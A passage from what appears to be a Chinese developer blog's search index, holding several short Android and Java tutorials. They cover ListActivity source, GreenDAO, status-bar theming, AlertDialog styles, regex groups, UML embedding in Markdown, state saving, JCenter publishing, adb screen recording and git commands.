也就是说，你可以自己setContentView()，只要你的布局有一个viewId是android:id=&quot;@android:id/list&quot;的就行。看到这你可能会无语，就一个简单的ListView就完事了？这么简单我也会啊！别急，这只是完成了基本的功能而已，还要开放一些接口给子Activity调用。有了ListView当然要实现各种事件啊。123456789public void setSelection(int position) &#123; mList.setSelection(position);&#125;public int getSelectedItemPosition() &#123; return mList.getSelectedItemPosition();&#125;public long getSelectedItemId() &#123; return mList.getSelectedItemId();&#125; 当然还有点击事件，我们发现有一个点击的监听器mOnClickListener。12345678private AdapterView.OnItemClickListener mOnClickListener = new AdapterView.OnItemClickListener() &#123; public void onItemClick(AdapterView&lt;?&gt; parent, View v, int position, long id) &#123; onListItemClick((ListView)parent, v, position, id); &#125;&#125;;protected void onListItemClick(ListView l, View v, int position, long id) &#123; //空方法，交由子类实现&#125; 既然有监听器，那又是在哪里设置了这个监听器呢？我们发现有一个onContentChanged()方法。12345678910111213141516171819public void onContentChanged() &#123; super.onContentChanged(); //Activity中是空方法 View emptyView = findViewById(com.android.internal.R.id.empty); //空数据时显示 mList = (ListView)findViewById(com.android.internal.R.id.list); //绑定ListView if (mList == null) &#123; throw new RuntimeException( "Your content must have a ListView whose id attribute is " + "'android.R.id.list'"); &#125; if (emptyView != null) &#123; mList.setEmptyView(emptyView); //多好啊，recyclerView就没有这个方法 &#125; mList.setOnItemClickListener(mOnClickListener); //设置点击事件 if (mFinishedStart) &#123; // 这个if不知道有什么用意 setListAdapter(mAdapter); &#125; mHandler.post(mRequestFocus); //待会解释 mFinishedStart = true;&#125; 可是翻遍源代码也没发现哪里调用了onContentChanged()。从字面上看，onContentChanged()是Content改变时的回调接口，等等，Content？我们不是在ensureList()中调用了setContentView()方法吗？答案是正确的，在调用了setContentView()，会调用onContentChanged()。12345678// Activity的setContentView()调用Window(具体子类是PhoneWindow)的setContentView()方法// 以下代码出现在PhoneWindow中@Override public void setContentView(int layoutResID) &#123; /** 省略部分代码 */ mLayoutInflater.inflate(layoutResID, mContentParent); getCallback().onContentChanged(); //注意这里!!!&#125; 再解释下，上面的mHandler.post(mRequestFocus);1234567891011private Runnable mRequestFocus = new Runnable() &#123; public void run() &#123; // 用来使ListView获取焦点。 mList.focusableViewAvailable(mList); &#125;&#125;;protected void onDestroy() &#123; // Activity销毁时移除 mHandler.removeCallbacks(mRequestFocus); super.onDestroy();&#125; 至此，ListActivity已经认识的差不多了。有什么讲错了希望能有大牛来提点一下。有兴趣的可以自己用recyclerView替换listView实现一个RecyclerActivity.]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android源码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[GreenDAO使用心得]]></title>
    <url>%2Fposts%2Fhow_to_use_GreenDAO.html</url>
    <content type="text"><![CDATA[前言作为一个程序员，基本的SQL语句是必须掌握的，但是如果单单使用原生的SQL语句，开发效率就太低了.虽然Android有给我们提供一套封装好的API，但我觉得并没有提高多少便利，反而增加了学习成本。我选择的是greenDAO .虽然github上realm-java 的星星比greenDAO高一点.但是realm-java 有一个弊端，就是apk的体积会大上5M左右。 下面一图说明greenDAO的好处 简单使用导入greenDAO 已经讲解的很清楚了。但是还是要说一下123456789//这段代码是放在根build.gradle而不是某个module的build.gradle里的buildscript &#123; repositories &#123; mavenCentral() &#125; dependencies &#123; classpath 'org.greenrobot:greendao-gradle-plugin:3.1.1' &#125;&#125; 12345//这段代码是放在android的module的build.gradle里的apply plugin: 'org.greenrobot.greendao'dependencies &#123; compile 'org.greenrobot:greendao:3.1.1'&#125; 12345//这段代码是放在java library的module的build.gradle里的(下一小节会提到)dependencies &#123; compile fileTree(include: ['*.jar'], dir: 'libs') compile 'org.greenrobot:greendao-generator:3.1.0'&#125; 创建一个新的Module首先需要一个Java Library，通俗的讲，就是用来创建一系列的实体类（一个类对应一个表）和数据库工具类。并且导入compile &#39;org.greenrobot:greendao-generator:3.1.0&#39;，上面有提到。 注意，我们创建的是Java Library，是Java Library，是Java Library。所以要用Java的方式写代码，而不是Android的方式。既然是Java的方式，就要写main函数。1234567891011121314151617181920212223242526272829303132333435363738public class Main &#123; private static final int VERSION = 1;//数据库的版本号，用来检测是否升级数据库 private static final String PACKAGE = "com.ahao.demo.dao";//自动生成代码的包名 private static final String OUT_DIR = "./app/src/main/java-gen";//自动生成代码的路径 public static void main(String[] args) throws Exception &#123; // 创建了一个用于添加实体（Entity）的模式（Schema）对象。 Schema schema = new Schema(VERSION, PACKAGE); // 添加一个实体(类),一个实体(类)对应一张表 addNote(schema); // 创建存放自动生成代码的目录 rebuild(OUT_DIR); // 自动生成代码 new DaoGenerator().generateAll(schema, OUT_DIR); &#125; private static void addNote(Schema schema) &#123; // 一个实体（类）就关联到数据库中的一张表，此处表名为「Note」（既类名） Entity note = schema.addEntity("Note"); // 你也可以重新给表命名 // note.setTableName("NODE"); // greenDAO 会自动根据实体类的属性值来创建表字段，并赋予默认值 // 接下来你便可以设置表中的字段： note.addIdProperty();//添加一个id主键字段 note.addStringProperty("text").notNull();//添加一个名为TEXT的String字段 // 与在 Java 中使用驼峰命名法不同，默认数据库中的命名是使用大写和下划线来分割单词的。 // 例如,一个名为creationDate的属性,在表中的字段名为CREATION_DATE note.addStringProperty("comment"); note.addDateProperty("date");//添加一个Data字段 &#125; // 确保outdir文件夹存在 public static void rebuild(String file) &#123; File outDir = new File(OUT_DIR); outDir.delete(); outDir.mkdir(); &#125;&#125; 那么问题来了，生成的代码到哪里去了呢？要如何使用呢？ 自动生成代码运行代码 如果出现以下信息就是创建成功 切换到Project Files视图，可以看到代码已经自动生成了 这里引用 一下 DaoMaster：一看名字就知道它是Dao中的最大的官了。它保存了sqlitedatebase对象以及操作DAO classes（注意：不是对象）。其提供了一些创建和删除table的静态方法，其内部类OpenHelper和DevOpenHelper实现了SQLiteOpenHelper并创建数据库的框架。 DaoSession：会话层。操作具体的DAO对象（注意：是对象），比如各种getter方法。 XXXDao：实际生成的某某DAO类，通常对应具体的java类，比如NoteDao等。其有更多的权限和方法来操作数据库元素。 XXXEntity：持久的实体对象。通常代表了一个数据库row的标准java properties。]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>数据库</tag>
        <tag>ORM</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android沉浸式状态栏]]></title>
    <url>%2Fposts%2FAndroid_Using_Immersive_Full-Screen_Mode.html</url>
    <content type="text"><![CDATA[前言沉浸式状态栏的实现方式在以前是五花八门。在这里主要是给出一个我觉得比较完美的实现沉浸式状态栏的方案（兼容最低android4.4）。 效果图android 5.0 以上 android 4.4 API 19 以上都是原生安卓系统的效果，具体到国内的各种各样改过的系统可能会有细微差别，我测试小米和华为的机器效果基本一样。 实现修改主题属性在values-v19之后的主题属性中添加一条即可,如下1&lt;item name="android:windowTranslucentStatus"&gt;true&lt;/item&gt; 设置fitsSystemWindows属性如果你想让一个View的图像显示在状态栏下，那么就在View的XML布局文件中添加如下属性1android:fitsSystemWindows="true" 例子：这里我设置了ToolBar1234567891011121314151617181920&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;android.support.design.widget.CoordinatorLayout xmlns:android="http://schemas.android.com/apk/res/android" xmlns:app="http://schemas.android.com/apk/res-auto" xmlns:tools="http://schemas.android.com/tools" android:layout_width="match_parent" android:layout_height="match_parent" tools:context="com.mjj.statusbar.MainActivity"&gt; &lt;android.support.design.widget.AppBarLayout android:layout_width="match_parent" android:layout_height="wrap_content" android:theme="@style/AppTheme.AppBarOverlay"&gt; &lt;android.support.v7.widget.Toolbar android:id="@+id/toolbar" android:layout_width="match_parent" android:layout_height="?attr/actionBarSize" android:background="?attr/colorPrimary" android:fitsSystemWindows="true" app:popupTheme="@style/AppTheme.PopupOverlay" /&gt; &lt;/android.support.design.widget.AppBarLayout&gt;&lt;/android.support.design.widget.CoordinatorLayout&gt; 注意：如果你在同一个布局中添加了多个这个属性，那么一般只有最外层View的这个属性生效 调整View高度上面两步都是统一的，这一步就比较有针对性了，对不同布局和API版本都会有所微调，主要是顶部View的高度。如果你像我一样基本使用原生控件，那么一般情况下是调整ToolBar(ActionBar)的高度。你需要给Toolbar加上系统状态栏的高度，因为如果你设置了前面两步，那么ToolBar会上移到状态栏下面,如图 我比较喜欢的处理方式是在java代码中改变高度,注意需要判断安卓版本，样例如下：（具体获取状态栏高度的代码可以到后面的参考资料中看，也可以在我的Demo中看源码）1234567891011mToolbar = (Toolbar) findViewById(R.id.toolbar); if (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.KITKAT)&#123; mToolbar.getLayoutParams().height = getAppBarHeight(); mToolbar.setPadding(mToolbar.getPaddingLeft(), getStatusBarHeight(), mToolbar.getPaddingRight(), mToolbar.getPaddingBottom());&#125;setSupportActionBar(mToolbar); 当然了，也有一些同学喜欢在XML中定义，那么就需要写一些分离区分版本的XML文件。目前的话安卓手机端除6.0的系统状态栏是24dp,其它都是25dp。 参考资料 API 19 设置状态栏 获取状态栏的高度]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Toolbar</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[改变support中AlertDialog的样式]]></title>
    <url>%2Fposts%2Fchange_the_style_of_AlertDialog.html</url>
    <content type="text"><![CDATA[前言 原文:http://blog.isming.me/2015/08/31/modify-alert-style/ android最近的support库提供了AlertDialog，可以让我们在低于5.0的系统使用到跟5.0系统一样的Material Design风格的对话框。 步骤自定义一个Style在values/styles.xml中创建一个Style12345678&lt;style name="MyAlertDialogStyle" parent="Theme.AppCompat.Light.Dialog.Alert"&gt; &lt;!-- Used for the buttons --&gt; &lt;item name="colorAccent"&gt;#FFC107&lt;/item&gt; &lt;!-- Used for the title and text --&gt; &lt;item name="android:textColorPrimary"&gt;#FFFFFF&lt;/item&gt; &lt;!-- Used for the background --&gt; &lt;item name="android:background"&gt;#4CAF50&lt;/item&gt;&lt;/style&gt; 在创建对话框时使用123456AlertDialog.Builder builder = new AlertDialog.Builder(this, R.style.MyAlertDialogStyle);builder.setTitle("AppCompatDialog");builder.setMessage("Lorem ipsum dolor...");builder.setPositiveButton("OK", null);builder.setNegativeButton("Cancel", null);builder.show(); 全局使用style（可选）这样的方法是每个地方使用的时候，都要在构造函数传我们的这个Dialog的Theme，我们也可以全局的定义对话框的样式。1234&lt;style name="MyTheme" parent="Base.Theme.AppCompat.Light"&gt; &lt;item name="alertDialogTheme"&gt;@style/MyAlertDialogStyle&lt;/item&gt; &lt;item name="colorAccent"&gt;@color/accent&lt;/item&gt;&lt;/style&gt; 在我们的AndroidManifest.xml文件中声明application或者activity的时候设置theme为MyTheme即可.不过需要注意的一点是，我们的Activity需要继承自AppCompatActivity。]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>AlertDialog</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[group()和group(i)的区别]]></title>
    <url>%2Fposts%2FThe_difference_between_group()_and_group(i).html</url>
    <content type="text"><![CDATA[前言最近在做网络爬虫，需要用到正则表达式，所以学习一下。 先看代码 123456789101112131415161718public class Main&#123; public static void main(String[] args)&#123; String Line = "abcdefg"; String regular = "(b)([\\s\\S]+?)(f)"; System.out.println(getRegular(Line, regular).get(0)); &#125; private static List&lt;String&gt; getRegular(String line, String regular) &#123; List&lt;String&gt; code = new ArrayList&lt;String&gt;(); Pattern pattern = Pattern.compile(regular); Matcher matcher = pattern.matcher(line); while(matcher.find())&#123; code.add(matcher.group(1));//看这里的group的参数 &#125; return code; &#125; &#125; 我们的目的是获取字符串Line中的cde部分，也就是ab和fg之间的子字符串。这里不详解ab([\\s\\S]+?)fg的含义，只要知道是满足上述要求的正则表达式即可。在官方文档jdk中对group()的定义如下 String group(); 返回由以前匹配操作所匹配的输入子序列。 String group(int group); 返回在以前匹配操作期间由给定组捕获的输入子序列。 int groupCount(); 返回此匹配器模式中的捕获组数。 这里的捕获组数，简单来说就是，正则表达式中有多少个括号，通过groupCount()获取捕获组数 函数 获取数据组 (b)([\\s\\S]+?)(f)对abcdefg正则结果 group() 所有组 bcdef group(0) 所有组 bcdef group(1) 第1组 b group(2) 第2组 cde group(3) 第3组 f 那么问题来了，如果String regular = &quot;b([\\s\\S]+?)f&quot;;把b和f的括号去掉，结果使用groupCount()获取的组数为1，而不是之前的3。也就是说，group(1)获取的是cde，而不是之前的b。 值得注意的是group()会出现越界问题，要注意。]]></content>
      <categories>
        <category>Java SE</category>
      </categories>
      <tags>
        <tag>正则表达式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[在Markdown中嵌入UML文档]]></title>
    <url>%2Fposts%2Finsert_UML_to_Markdown.html</url>
    <content type="text"><![CDATA[原文 Markdown 是网络书写语言，特别适合程序员书写文档： 全文本格式，方便进行diff，patch和版本的管理； 格式直观，简单易学，便于书写和阅读； 兼容 HTML，能方便地转换为 pdf，doc等格式； 支持 Linux，Windows，Mac； 支持内嵌代码和语法高亮； 估计只是方便版本管理，就能吸引很多程序员的兴趣，特别是需要团队一起参与书写文档的时候。感兴趣的可以参考官方网站，或者以前写的一份使用 Markdown 的 slides。但是毕竟Markdown只是书写语言，不是程序设计语言，如果我们需要嵌入 UML 的时候，不可避免地需要其他专业软件的支持。这里介绍几种利用网络服务，可以直接在Markdown文档中嵌入的 UML 建模图： 用例图角色(Actor)使用[角色名]表示角色。1&lt;img src="http://yuml.me/diagram/scruffy/usecase/[Customer]"/&gt; 用例(Use Case)使用(用例名)表示用例，-表示角色和用例之间的关联。1&lt;img src="http://yuml.me/diagram/scruffy/usecase/[Customer]-(Login),[Customer]-(Logout)" /&gt; 备注(Notes)如果用例名以note:开头，表明那是一个备注，可以用{bg:颜色名}定义备注的背景色。1&lt;img src="http://yuml.me/diagram/scruffy/usecase/[Customer]-(Login), [Customer]-(note: Cust can be registered or not&#123;bg:beige&#125;)" /&gt; 角色继承(Actor Inheritance)使用符号^表示角色之间的继承关系。1&lt;img src="http://yuml.me/diagram/scruffy/usecase/[Cms Admin]^[User], [Customer]^[User], [Agent]^[User]" /&gt; 扩展和包含(Extends and Includes)使用&gt;表示用例之间的包含关系，&lt;表示用例的扩展。1&lt;img src="http://yuml.me/diagram/scruffy/usecase/(Login)&lt;(Register),(Login)&lt;(Request Password Reminder),(Register)&gt;(Confirm Registration)" /&gt; 完整示例1&lt;img src="http://yuml.me/diagram/nofunky/usecase/(note: figure 1.2&#123;bg:beige&#125;), [User]-(Login),[Site Maintainer]-(Add User),(Add User)&lt;(Add Company),[Site Maintainer]-(Upload Docs),(Upload Docs)&lt;(Manage Folders),[User]-(Upload Docs), [User]-(Full Text Search Docs), (Full Text Search Docs)&gt;(Preview Doc),(Full Text Search Docs)&gt;(Download Docs), [User]-(Browse Docs), (Browse Docs)&gt;(Preview Doc), (Download Docs), [Site Maintainer]-(Post New Event To The Web Site), [User]-(View Events)" /&gt; YUML支持3种图示风格分别是： plain scruffy boring 你可以对比下列图示的不同风格：123&lt;img src="http://yuml.me/diagram/plain/usecase/[Customer]-(Login),[Customer]-(Logout),(login)%3C(Register)"/&gt;&lt;img src="http://yuml.me/diagram/scruffy/usecase/[Customer]-(Login),[Customer]-(Logout),(login)%3C(Register)"/&gt;&lt;img src="http://yuml.me/diagram/boring/usecase/[Customer]-(Login),[Customer]-(Logout),(login)%3C(Register)"/&gt; 活动图动作(Action)用(状态名)表示一个状态，其中(start)和(end)分别表示开始状态和结束状态，箭头-&gt;表示状态的转换。1&lt;img src="http://yuml.me/diagram/nofunky/activity/(start)-&gt;(Boil Kettle)-&gt;(end)" /&gt; 判断和限制(Decisions and Constraints)使用&lt;判断名&gt;表示一个条件判断，其后跟[条件]-&gt;表示满足条件后状态的转换；用不同的判断名来标识不同的判定位置。1&lt;img src="http://yuml.me/diagram/nofunky/activity/(start)-&gt;&lt;a&gt;[kettle empty]-&gt;(Fill Kettle)-&gt;(Boil Kettle),&lt;a&gt;[kettle full]-&gt;(Boil Kettle)-&gt;(end)" /&gt; 分支合并(Fork/Join)使用||表示分支或者合并点。1&lt;img src="http://yuml.me/diagram/nofunky/activity/(start)-&gt;&lt;a&gt;[kettle empty]-&gt;(Fill Kettle)-&gt;|b|,&lt;a&gt;[kettle full]-&gt;|b|-&gt;(Boil Kettle)-&gt;|c|,|b|-&gt;(Add Tea Bag)-&gt;(Add Milk)-&gt;|c|-&gt;(Pour Water)-&gt;(end),(Pour Water)-&gt;(end)" /&gt; 对象(Objects)符号[]表示一个对象。1&lt;img src="http://yuml.me/diagram/nofunky/activity/(start)-&gt;[Water]-&gt;(Fill Kettle)-&gt;(end)" /&gt; 连接器名称(Connector Name)在-&gt;中加入名称，-名称&gt;表示命名连接器。1&lt;img src="http://yuml.me/diagram/nofunky/activity/(start)-fill&gt;(Fill Kettle)-&gt;(end)" /&gt; 类图关联(Association)类名用[]表示，-&gt;表示定向关联，-表明关联。1&lt;img src="http://yuml.me/diagram/nofunky/class/[Customer]-&gt;[Billing Address]" /&gt; 基数(Cardinality)基数-基数&gt;表明关联的基数，其中基数可以为0，1，0..*，*等任意定义的值。1&lt;img src="http://yuml.me/diagram/nofunky/class/[Customer]1-0..*[Address]"/&gt; 定向关联(Directional Association)定向关联-&gt;可以定义名称：-名称&gt;。1&lt;img src="http://yuml.me/diagram/nofunky/class/[Order]-billing/&gt;[Address], [Order]-shipping/&gt;[Address]"/&gt; 颜色和UTF8字符(Splash of Colour And UTF-8)类图可以用{bg:颜色名}定义显示的背景颜色。1&lt;img src="http://yuml.me/diagram/nofunky/class/[❝Customer❞&#123;bg:orange&#125;]❶- ☂&gt;[Order&#123;bg:green&#125;]"/&gt; 聚合(Aggregation)聚合表示比关联更强的关联关系，使用&lt;&gt;-&gt;或者+-&gt;来表示。1&lt;img src="http://yuml.me/diagram/nofunky/class/[Company]&lt;&gt;-1&gt;[Location], [Location]+-&gt;[Point]"/&gt; 组成(Composition)组成表示比聚合更强的关联关系，使用++-&gt;来表示。1&lt;img src="http://yuml.me/diagram/nofunky/class/[Company]++-1&gt;[Location]"/&gt; 备注(Notes)使用[note:注解内容]表示备注，同样备注可以自定义颜色{bg:颜色名}。1&lt;img src="http://yuml.me/diagram/nofunky/class/[Customer]&lt;&gt;1-&gt;*[Order], [Customer]-[note: Aggregate Root&#123;bg:cornsilk&#125;]"/&gt; 继承(Inheritance)使用^-表示类的继承，右边的类是子类。1&lt;img src="http://yuml.me/diagram/nofunky/class/[Wages]^-[Salaried], [Wages]^-[Contractor]"/&gt; 接口继承(Interface Inheritance)接口继承用^-.-来表示。1&lt;img src="http://yuml.me/diagram/nofunky/class/[&lt;&lt;ITask&gt;&gt;]^-.-[NightlyBillingTask]"/&gt; 依赖(Dependencies)类的依赖用-.-&gt;来表示，依赖是最弱的关联关系，一般用来表示类方法的参数或者实现用到了依赖类。1&lt;img src="http://yuml.me/diagram/nofunky/class/[HttpContext]uses -.-&gt;[Response]"/&gt; 接口(Interface)和类名相比，接口的名称一般包含在&lt;&lt;&gt;&gt;中。1&lt;img src="http://yuml.me/diagram/nofunky/class/[&lt;&lt;IDisposable&gt;&gt;;Session]"/&gt; 类定义(Class with Details)可以在类符号[]中定义类的所有成员。使用|表示类名与类成员变量和成员函数的分割符，不同的成员之间用;隔开，使用+，-分别表示公开和私有成员。1&lt;img src="http://yuml.me/diagram/nofunky/class/[User|+Forename+;Surname;+HashedPassword;-Salt|+Login();+Logout()]"/&gt; 完整的示例1&lt;img src="http://yuml.me/diagram/nofunky/class/[note: You can stick notes on diagrams too!&#123;bg:cornsilk&#125;],[Customer]&lt;&gt;1-orders 0..*&gt;[Order], [Order]++*-*&gt;[LineItem], [Order]-1&gt;[DeliveryMethod], [Order]*-*&gt;[Product], [Category]&lt;-&gt;[Product], [DeliveryMethod]^[National], [DeliveryMethod]^[International]"/&gt; 时序图首先在文件头加入如下 javascript 文件：1&lt;script type="text/javascript" src="http://www.websequencediagrams.com/service.js"&gt;&lt;/script&gt; 同步/异步/返回消息(Synchronous/Asynchronous/Return Message)一般使用实心箭头-&gt;表示同步消息或调用，开箭头-&gt;&gt;表示异步消息或调用，虚箭头--&gt;或--&gt;&gt;表示返回消息。1234567&lt;div class=wsd wsd_style="rose" &gt;&lt;pre&gt; # This is a comment. Alice-&gt;Bob: Filled arrow Alice-&gt;&gt;Bob: Open arrow Bob--&gt;Alice: Dotted line Bob--&gt;&gt;Alice: Dotted Line, open arrow&lt;/pre&gt;&lt;/div&gt; 定义参与者的顺序通过participant可以定义角色在时序图中的显示顺序，而不是按照缺省的参与者被使用顺序来显示。并且可以定义参与者的别名。123456789&lt;div class=wsd wsd_style="rose" &gt;&lt;pre&gt; participant Bob participant Alice participant "I have a really\nlong name" as L # Alice-&gt;Bob: Authentication Request Bob-&gt;Alice: Authentication Response Bob-&gt;L: Log transaction&lt;/pre&gt;&lt;/div&gt; 自关联消息(Self-Message)参与者可以发送一个消息给自己。你可以用\n将文字切分成多行。123&lt;div class=wsd wsd_style="rose" &gt;&lt;pre&gt; Alice-&gt;Alice: This is a signal to self.\nIt also demonstrates \nmultiline \ntext.&lt;/pre&gt;&lt;/div&gt; 分组消息通过alt/else，opt和loop，将消息分组，组头显示分组定义的文本信息，end关键字用来结束一个分组。分组可以嵌套。123456789101112131415&lt;div class=wsd wsd_style="rose" &gt;&lt;pre&gt; Alice-&gt;Bob: Authentication Request alt successful case Bob-&gt;Alice: Authentication Accepted else some kind of failure Bob-&gt;Alice: Authentication Failure opt loop 1000 times Alice-&gt;Bob: DNS Attack end end else Another type of failure Bob-&gt;Alice: Please repeat end&lt;/pre&gt;&lt;/div&gt; 备注(Notes)使用note left of，note right of和note over分别定义左/右/中显示的备注，可以包含多行，end note用来结束该段note。123456789101112&lt;div class=wsd wsd_style="rose" &gt;&lt;pre&gt; participant Alice participant Bob # note left of Alice This is displayed left of Alice. end note note right of Alice: This is displayed right of Alice. note over Alice: This is displayed over Alice. note over Alice, Bob: This is displayed over Bob and Alice.&lt;/pre&gt;&lt;/div&gt; 生命线的激活和终止(Activation/Destruction)+来表示激活被发送者，-表示终止发送者。destroy关键字可以将销毁该参与者。123456789&lt;div class=wsd wsd_style="rose"/&gt;&lt;pre&gt; User-&gt;+A: DoWork A-&gt;+B: &lt;&lt;createRequest&gt;&gt; B-&gt;+C: DoWork C--&gt;B: WorkDone destroy C B--&gt;-A: RequestCreated A-&gt;User: Done&lt;/pre&gt;&lt;/div&gt; 其他工具 JUMLY yUML command line tool Scruffy UML]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>Markdown</tag>
        <tag>UML</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Activity、Fragment状态缓存和恢复]]></title>
    <url>%2Fposts%2FSave_Restore_Activity%E2%80%99s_and_Fragment%E2%80%99s_state.html</url>
    <content type="text"><![CDATA[资料 Activity/Fragment状态缓存和恢复的最佳实践译文 总结ActivityActivity中已经自己实现了。只要重写onSaveInstanceState()和onRestoreInstanceState()这两个方法即可12345678910protected void onSaveInstanceState(Bundle outState) &#123; outState.putString("key", "value"); super.onSaveInstanceState(outState);&#125;protected void onRestoreInstanceState(Bundle savedInstanceState) &#123; super.onRestoreInstanceState(savedInstanceState); String value = savedInstanceState.getString("key"); Log.i(TAG, "onRestoreInstanceState: "+value);&#125; FragmentFragment分为两种： 一种是View的Save/Restore 另一种是Fragment自身数据的Save/Restore View的Save/Restore和Activity一样，在View内部实现onSaveInstanceState()和onRestoreInstanceState()即可。如果是第三方的View，则写一个子类手动实现Save/Restore即可。 Fragment的Save/Restore在Fragment内部实现onSaveInstanceState()和onActivityCreated()即可。12345678910protected void onSaveInstanceState(Bundle outState) &#123; outState.putString("key", "value"); super.onSaveInstanceState(outState);&#125;protected void onActivityCreated(Bundle savedInstanceState) &#123; super.onActivityCreated(savedInstanceState); String value = savedInstanceState.getString("key"); Log.i(TAG, "onRestoreInstanceState: "+value);&#125;]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Activity</tag>
        <tag>Fragment</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PreferenceActivity实现Toolbar]]></title>
    <url>%2Fposts%2FHow_to_set_Toolbar_with_PreferenceActivity.html</url>
    <content type="text"><![CDATA[前言尝试使用PreferenceActivity时，发现从有Toolbar的上一个Activity进入了没有Toolbar的Activity，感觉太丑了。但是google居然没有推出AppCompatPreferenceActivity，没办法只好自己写。 PreferenceActivity+ToolBar(限Android 5.0以上)思路模仿AppCompatActivity，对PreferenceActivity进行改造 实现继承PreferenceActivity重写onCreate方法添加如下代码:12345678910111213141516171819202122232425@Overrideprotected void onCreate(Bundle savedInstanceState) &#123; getDelegate().installViewFactory(); getDelegate().onCreate(savedInstanceState); super.onCreate(savedInstanceState); /** 初始化StatusBar,交由子类实现 */ setStatusBar(); /** 获取DecorView下的ContentView*/ ViewGroup contentViews = (ViewGroup) findViewById(android.R.id.content); /** 获取ContentView的子View */ View content = contentView.getChildAt(0); /** 加载自定义布局文件,获取id交由子类实现 */ LinearLayout toolbarLayout = (LinearLayout) LayoutInflater.from(this).inflate(getActLayoutId(), null); /** 移除根布局所有子view */ contentView.removeAllViews(); /** 注意这里一要将前面移除的子View添加到我们自定义布局文件中，否则PreferenceActivity中的Header将不会显示 */ toolbarLayout.addView(content); /** 将包含Toolbar的自定义布局添加到根布局中 */ contentView.addView(toolbarLayout); /** 设置Toolbar,获取Toolbar的Id的方法交由子类实现 */ mToolbar = (Toolbar) toolbarLayout.findViewById(getActToolbarId()); /** 初始化Toolbar,交由子类实现 */ initToolbar(getToolbar()); &#125; AppCompatActivity+PreferenceFragment+ToolBar(适用于Android 5.0以下)思路在Activity中设置Toolbar，使用事务替换Fragment的方法。 实现和普通的使用Fragment方法一样，这里不赘述。]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Activity</tag>
        <tag>Fragment</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用Gradle发布Android开源项目到JCenter]]></title>
    <url>%2Fposts%2Fhow_to_use_Gradle_to_publish_project_to_JCenter.html</url>
    <content type="text"><![CDATA[登录 使用bintray-release发布 使用github帐号登录https://bintray.com/ ，你可以点击Your Profile-&gt;Edit-&gt;API Key，复制。 AS在最顶层的gradle中添加1234567891011121314buildscript &#123; repositories &#123;...&#125; dependencies &#123; classpath 'com.android.tools.build:gradle:2.1.2' classpath 'com.novoda:bintray-release:0.3.4'//添加 &#125;&#125;allprojects &#123; repositories &#123;...&#125; tasks.withType(Javadoc) &#123;//添加 options&#123; encoding "UTF-8" charSet 'UTF-8' links "http://docs.oracle.com/javase/7/docs/api" &#125; &#125;&#125; 在想要上传的module添加123456789101112apply plugin: 'com.android.library'apply plugin: 'com.novoda.bintray-release'//添加android &#123;...&#125;dependencies &#123;...&#125;publish &#123; userOrg = 'ahaochan' groupId = 'com.ahaochan' artifactId = 'TabLayout'//项目名 publishVersion = '0.0.2'//版本号 desc = 'Imitate WeChat6.0 TabLayout'//描述 website = 'https://github.com/Ahaochan/TabLayout'//github地址&#125; 最后在AS底下的Terminal中输入1234gradlew clean build bintrayUpload -PbintrayUser=ahaochan-PbintrayKey=之前复制的key-PdryRun=false]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[adb制作gif]]></title>
    <url>%2Fposts%2Fhow_to_use_adb_to_create_gif.html</url>
    <content type="text"><![CDATA[演示有时候我们需要录制Android手机的屏幕，比如写了一个Demo应用，需要发布到博客和微博上。如下是我录制转GIF的效果图 正常录制123adb devicesadb -s 驱动编号 shell screenrecord /sdcard/test.mp4adb -s 驱动编号 pull /sdcard/test.mp4 C:\Users\Avalon\Desktop 视频保存目录可以自己指定，如上面的/sdcard/test.mp4，命令执行后会一直录制180s，按下ctrl+c可以提前结束录制 截图12adb -s 驱动编号 shell /system/bin/screencap -p /sdcard/screenshot.pngadb -s 驱动编号 pull /sdcard/screenshot.png C:\Users\Avalon\Desktop 转GIF文件在Windows下有个不错的软件Free Video to GIF Converter 可以把mp4转换成GIF。转换时还可以删除不需要的帧，这点真得很不错。Mac上可以使用gifrocket 进行转换。还有一些在线的转换工具 可以使用，但是都会打上水印。 其他设置 设定视频分辨率adb shell screenrecord --size 848x480 /sdcard/test.mp4 设定视频比特率adb shell screenrecord --bit-rate 2000000 /sdcard/test.mp4]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[git使用]]></title>
    <url>%2Fposts%2Fhow_to_use_GitHub_with_git.html</url>
    <content type="text"><![CDATA[常用上传 初始化git init 添加所有文件git add . 提交到本地仓库git commit -m &quot;描述&quot; 连接github分支git pull origin master 连接到github仓库git remote add origin git@github.com:Ahaochan/项目名.git 提交到远程仓库git push -u origin master 常用下载123git clone https://github.com/seven332/EhViewercd EhViewer./gradlew app:assembleDebug 分支相关 新建分支：git branch 分支名 切换分支：git checkout 分支名 上传分支：git push origin 分支名 删除本地分支：git branch -d 分支名 删除github分支(分支名前的冒号代表删除)：git push origin :分支名 Tag相关 为过往commit添加tag 12git log --onelinegit tag -a v1.00 -m "描述" b6195be 查看tag：git tag 删除tag：git tag -d v1.00 删除github Tag：git push origin :v1.00 提交github仓库：git push origin v1.00]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[观察者模式]]></title>
    <url>%2Fposts%2FObserver_Pattern.html</url>
